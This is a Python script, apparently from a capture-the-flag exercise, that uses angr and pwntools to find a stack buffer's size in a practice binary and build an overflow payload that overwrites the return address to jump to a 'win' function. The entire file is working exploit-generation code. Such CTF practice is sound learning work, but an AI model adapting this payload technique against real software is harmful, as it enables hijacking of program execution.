import angr
import claripy
import sys
from angr.storage.file import SimFileStream
from pwn import *

def angr_find_sol():
    path_to_binary = '/home/kali/Desktop/svt/exploits/recv_bin'
    #path_to_binary = '/home/kali/Desktop/svt/CTFs/part3/autopwn'

    project = angr.Project(path_to_binary, auto_load_libs=False)
    
    obj = project.loader.main_object
    
    # 1. Get the real address of pwnme func
    pwnme_addr = obj.get_symbol("pwnme").rebased_addr

    off_from_pwnme = 0x00401185 - 0x0040116c     #from first binary, structure is the same
    
    buff_len_inst_address = pwnme_addr + off_from_pwnme # addr of instruction: lea rax, [rbp - OFFSET]
    #buffer is at rbp-offset and has offset bytes

    block = project.factory.block(buff_len_inst_address, size=16)

    for insn in block.capstone.insns:
        if insn.mnemonic == 'lea' and 'rbp -' in insn.op_str:
            # Extract the hex value after minus
            # op_str example: "rax, [rbp - 0xe]"
            import re
            match = re.search(r'rbp - (0x[0-9a-f]+)', insn.op_str)
            if match:
                buffer_offset = int(match.group(1), 16)
                print(buffer_offset)
                break
        else:
            raise Exception("Buffer len instruction not found")

    win_addr = obj.get_symbol("win").rebased_addr

    # Payload
    # [Null Byte] + [Junk] + [win Address]
    # Total distance to RIP = buffer_offset + 8 (saved rbp)
    
    padding_len = buffer_offset + 8
    
    # \x00 at start to bypass the XOR loop
    payload = b'\x00' + b'A' * (padding_len - 1) + p64(win_addr)
    
    return payload

def main():
    try:
        print(angr_find_sol())
    except Exception as e:
        print(e)

if __name__ == '__main__':
  main()